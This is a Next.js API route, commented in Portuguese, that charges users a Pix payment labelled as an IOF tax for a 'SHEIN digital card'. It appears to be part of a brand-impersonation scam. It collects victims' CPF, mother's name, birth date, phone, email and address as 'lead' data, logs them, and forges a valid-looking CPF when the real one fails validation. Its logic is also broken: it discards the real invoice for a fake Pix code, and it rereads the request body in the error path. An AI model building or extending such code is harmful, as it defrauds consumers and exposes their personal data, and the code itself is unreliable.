import { type NextRequest, NextResponse } from "next/server"

// Função para validar CPF
function validateCPF(cpf: string): boolean {
  cpf = cpf.replace(/[^\d]/g, "")
  if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false

  let sum = 0
  for (let i = 0; i < 9; i++) {
    sum += Number.parseInt(cpf.charAt(i)) * (10 - i)
  }
  let remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  if (remainder !== Number.parseInt(cpf.charAt(9))) return false

  sum = 0
  for (let i = 0; i < 10; i++) {
    sum += Number.parseInt(cpf.charAt(i)) * (11 - i)
  }
  remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  return remainder === Number.parseInt(cpf.charAt(10))
}

// Função para gerar CPF válido
function generateValidCPF(): string {
  const cpf = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10))

  let sum = 0
  for (let i = 0; i < 9; i++) {
    sum += cpf[i] * (10 - i)
  }
  let remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  cpf.push(remainder)

  sum = 0
  for (let i = 0; i < 10; i++) {
    sum += cpf[i] * (11 - i)
  }
  remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  cpf.push(remainder)

  return cpf.join("")
}

// Função para obter IP do cliente
function getClientIP(request: NextRequest): string {
  const forwarded = request.headers.get("x-forwarded-for")
  const realIP = request.headers.get("x-real-ip")

  if (forwarded) {
    return forwarded.split(",")[0].trim()
  }
  if (realIP) {
    return realIP
  }
  return "192.168.1.1" // Fallback
}

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA IOF PIX ===")

    const body = await request.json()
    const { amount, type } = body

    console.log("Dados IOF recebidos:", { amount, type })

    // Validar dados obrigatórios
    if (!amount) {
      return NextResponse.json(
        {
          success: false,
          error: "Valor IOF não fornecido",
        },
        { status: 400 },
      )
    }

    // Obter access token
    const authResponse = await fetch(`${request.nextUrl.origin}/api/tryplopay/auth`)
    const authData = await authResponse.json()

    if (!authData.success) {
      throw new Error("Falha na autenticação")
    }

    const { access_token, account } = authData.data
    const isSimulation = authData.fallback || authData.data.working === "SIMULATION"

    // Carregar dados reais do usuário coletados durante o fluxo
    const getUserData = () => {
      try {
        // Dados do CPF (nome, CPF, data nascimento, nome da mãe)
        const cpfDataStr = request.headers.get("x-cpf-data") || "{}"
        const cpfData = JSON.parse(cpfDataStr)

        // Email do formulário
        const userEmail = request.headers.get("x-user-email") || ""

        // WhatsApp da página manager
        const userWhatsApp = request.headers.get("x-user-whatsapp") || ""

        // Endereço da página delivery-address
        const deliveryAddressStr = request.headers.get("x-delivery-address") || "{}"
        const deliveryAddress = JSON.parse(deliveryAddressStr)

        return {
          nome: cpfData.nome || "Cliente SHEIN",
          cpf: cpfData.cpf || "12345678901",
          email: userEmail || "cliente@shein.com.br",
          telefone: userWhatsApp || "11999999999",
          dataNascimento: cpfData.dataNascimento || "",
          nomeMae: cpfData.nomeMae || "",
          endereco: {
            rua: deliveryAddress.street || "Rua Exemplo",
            numero: deliveryAddress.number || "123",
            complemento: deliveryAddress.complement || "",
            bairro: deliveryAddress.neighborhood || "Centro",
            cidade: deliveryAddress.city || "São Paulo",
            estado: deliveryAddress.state || "SP",
            cep: deliveryAddress.zipCode?.replace(/\D/g, "") || "01000000",
          },
        }
      } catch (error) {
        console.log("⚠️ Erro ao carregar dados do usuário para IOF, usando fallback:", error)
        return {
          nome: "Cliente SHEIN",
          cpf: "12345678901",
          email: "cliente@shein.com.br",
          telefone: "11999999999",
          endereco: {
            rua: "Rua Exemplo",
            numero: "123",
            bairro: "Centro",
            cidade: "São Paulo",
            estado: "SP",
            cep: "01000000",
          },
        }
      }
    }

    const userData = getUserData()

    console.log("📋 Dados do lead carregados para IOF:")
    console.log("Nome:", userData.nome)
    console.log("CPF:", userData.cpf)
    console.log("Email:", userData.email)
    console.log("Telefone:", userData.telefone)
    console.log("Endereço:", userData.endereco)

    // Validar e corrigir CPF se necessário
    let document = userData.cpf?.replace(/[^\d]/g, "") || ""
    if (!validateCPF(document)) {
      console.log("⚠️ CPF inválido, gerando CPF válido para teste IOF")
      console.log("CPF original:", userData.cpf)
      document = generateValidCPF()
      console.log("CPF gerado:", document)
    } else {
      console.log("✅ CPF válido:", document)
    }

    // Usar o valor exato do IOF
    const totalAmount = Number.parseFloat(amount.toString())

    const productTitle = "Imposto IOF - Cartão Digital SHEIN"

    // Gerar external_id único para IOF
    const externalId = `SHEIN_IOF_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    // Preparar payload oficial da TryploPay para IOF
    const invoicePayload = {
      client: {
        name: userData.nome,
        document: document,
        email: userData.email,
        phone: userData.telefone?.replace(/[^\d]/g, "") || "11999999999",
        ip: getClientIP(request),
        address: {
          street: userData.endereco.rua,
          number: userData.endereco.numero,
          district: userData.endereco.bairro,
          city: userData.endereco.cidade,
          state: userData.endereco.estado,
          zipcode: userData.endereco.cep,
          country: "BRA",
        },
      },
      payment: {
        product_type: 2, // 2 para serviços (IOF)
        id: externalId,
        type: "3", // PIX
        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        referer: externalId,
        installments: "1",
        order_url: `${request.nextUrl.origin}/upp10/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/tryplopay/webhook`,
        discount: "0.00",
        products: [
          {
            id: "iof",
            image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
            title: productTitle,
            qnt: 1,
            discount: "0.00",
            amount: totalAmount.toFixed(2),
          },
        ],
      },
      shipping: {
        amount: 0, // Já incluído no produto
      },
    }

    let invoiceData

    if (!isSimulation) {
      // Tentar criar fatura real
      console.log("🔄 Criando fatura IOF real na TryploPay...")

      const apiUrl = process.env.TRYPLOPAY_API_URL || "https://api.tryplopay.com"

      const response = await fetch(`${apiUrl}/invoices`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${access_token}`,
        },
        body: JSON.stringify(invoicePayload),
      })

      if (response.ok) {
        const data = await response.json()
        console.log("✅ Fatura IOF real criada com sucesso")

        invoiceData = {
          id: data.fatura.id,
          invoice_id: data.fatura.invoice_id,
          external_id: externalId,
          pix: {
            payload: data.fatura.pix.payload,
            image: data.fatura.pix.image,
            qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(data.fatura.pix.payload)}`,
          },
          status: data.fatura.status,
          valores: data.fatura.valores,
          vencimento: data.fatura.vencimento,
          secure: data.fatura.secure,
          type: "real",
        }
      } else {
        throw new Error(`Erro na API IOF: ${response.status}`)
      }
    } else {
      throw new Error("Modo simulação ativado para IOF")
    }

    const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.iof.com/qr/v2/IOF${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN IOF5011SAO PAULO62070503***6304IOFX`

    const simulatedInvoice = {
      id: `IOF_SIM_${Date.now()}`,
      invoice_id: `IOF_SIMULATED_${Date.now()}`,
      external_id: externalId, // Adicionar external_id
      pix: {
        payload: simulatedPixCode,
        image: `/placeholder.svg?height=250&width=250`,
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(simulatedPixCode)}`,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(totalAmount * 100), // em centavos
        liquido: Math.round(totalAmount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      secure: {
        id: `simulated-iof-${Date.now()}`,
        url: `${request.nextUrl.origin}/upp10/checkout`,
      },
      type: "simulated",
    }

    console.log(`✅ Fatura IOF simulada criada - Valor: R$ ${totalAmount.toFixed(2)}`)

    return NextResponse.json({
      success: true,
      data: simulatedInvoice,
      fallback: true,
    })
  } catch (error) {
    console.log("❌ Erro ao criar fatura IOF, usando fallback:", error)

    // Extrair dados da requisição para fallback
    const body = await request.json()
    const { amount } = body
    const totalAmount = Number.parseFloat(amount?.toString() || "21.88")

    // Gerar external_id único para rastreamento IOF
    const externalId = `SHEIN_IOF_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    // Fallback para simulação IOF
    const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.iof.com/qr/v2/IOF${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN IOF5011SAO PAULO62070503***6304IOFX`

    const simulatedInvoice = {
      id: `IOF_SIM_${Date.now()}`,
      invoice_id: `IOF_SIMULATED_${Date.now()}`,
      external_id: externalId, // GARANTIR que está sempre presente
      pix: {
        payload: simulatedPixCode,
        image: `/placeholder.svg?height=250&width=250`,
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(simulatedPixCode)}`,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(totalAmount * 100), // em centavos
        liquido: Math.round(totalAmount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      secure: {
        id: `simulated-iof-${Date.now()}`,
        url: `${request.nextUrl.origin}/upp10/checkout`,
      },
      type: "simulated",
    }

    console.log(`✅ Fatura IOF simulada criada - External ID: ${externalId} - Valor: R$ ${totalAmount.toFixed(2)}`)

    return NextResponse.json({
      success: true,
      data: simulatedInvoice,
      fallback: true,
    })
  }
}
